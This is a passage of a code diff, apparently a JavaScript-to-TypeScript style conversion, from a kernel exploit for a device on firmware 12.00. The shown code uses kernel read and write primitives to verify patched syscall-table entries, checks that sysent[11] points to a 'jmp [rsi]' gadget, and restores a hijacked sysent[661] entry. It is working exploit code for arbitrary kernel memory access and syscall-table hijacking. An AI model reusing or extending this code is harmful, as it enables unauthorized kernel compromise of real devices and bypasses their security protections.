+        { off: 0x1102d80, exp: 0x02, name: 'sysent11_narg', size: 4 },
+        { off: 0x1102dac, exp: 0x01, name: 'sysent11_thrcnt', size: 4 },
+      ]
+
+      for (const p of patches_to_verify) {
+        let actual
         if (p.size === 1) {
-          actual = Number(kernel.read_byte(kernel.addr.base.add(p.off)));
+          actual = Number(kernel.read_byte(kernel.addr.base.add(p.off)))
         } else if (p.size === 2) {
-          actual = Number(kernel.read_word(kernel.addr.base.add(p.off)));
+          actual = Number(kernel.read_word(kernel.addr.base.add(p.off)))
         } else {
-          actual = Number(kernel.read_dword(kernel.addr.base.add(p.off)));
+          actual = Number(kernel.read_dword(kernel.addr.base.add(p.off)))
         }
+
         if (actual === p.exp) {
-          debug('  [OK] ' + p.name);
+          debug('  [OK] ' + p.name)
         } else {
-          debug('  [FAIL] ' + p.name + ': expected ' + hex(p.exp) + ', got ' + hex(actual));
-          patch_errors++;
+          debug('  [FAIL] ' + p.name + ': expected ' + hex(p.exp) + ', got ' + hex(actual))
+          patch_errors++
         }
       }
 
       // Special check for sysent[11] sy_call - should point to jmp [rsi] gadget
-      var sysent11_call = kernel.read_qword(kernel.addr.base.add(0x1102d88));
-      var expected_gadget = kernel.addr.base.add(0x47b31);
+      const sysent11_call = kernel.read_qword(kernel.addr.base.add(0x1102d88))
+      const expected_gadget = kernel.addr.base.add(0x47b31)
       if (sysent11_call && sysent11_call.eq(expected_gadget)) {
-        debug('  [OK] sysent11_call -> jmp_rsi @ ' + hex(sysent11_call));
+        debug('  [OK] sysent11_call -> jmp_rsi @ ' + hex(sysent11_call))
       } else {
-        debug('  [FAIL] sysent11_call: expected ' + hex(expected_gadget) + ', got ' + hex(sysent11_call !== null && sysent11_call !== void 0 ? sysent11_call : 0));
-        patch_errors++;
+        debug('  [FAIL] sysent11_call: expected ' + hex(expected_gadget) + ', got ' + hex(sysent11_call ?? 0))
+        patch_errors++
       }
+
       if (patch_errors === 0) {
-        debug('All 12.00 kernel patches verified OK!');
+        debug('All 12.00 kernel patches verified OK!')
       } else {
-        debug('[WARNING] ' + patch_errors + ' kernel patches failed!');
+        debug('[WARNING] ' + patch_errors + ' kernel patches failed!')
       }
     }
 
     // Restore original sysent[661]
-    debug('Restoring sysent[661]...');
-    kernel.write_dword(sysent_661_addr, sy_narg);
-    kernel.write_qword(sysent_661_addr.add(8), sy_call);
-    kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
-    debug('Restored sysent[661]');
-    debug('Kernel patches applied!');
-    return true;
+    debug('Restoring sysent[661]...')
+    kernel.write_dword(sysent_661_addr, sy_narg)
+    kernel.write_qword(sysent_661_addr.add(8), sy_call)
+    kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
+    debug('Restored sysent[661]')
+
+    debug('Kernel patches applied!')
+
+    return true
   } catch (e) {
-    var _stack;
-    debug('apply_kernel_patches error: ' + e.message);
-    debug((_stack = e.stack) !== null && _stack !== void 0 ? _stack : '');
-    return false;
+    debug('apply_kernel_patches error: ' + (e as Error).message)
+    debug((e as Error).stack ?? '')
+    return false
   }
 }
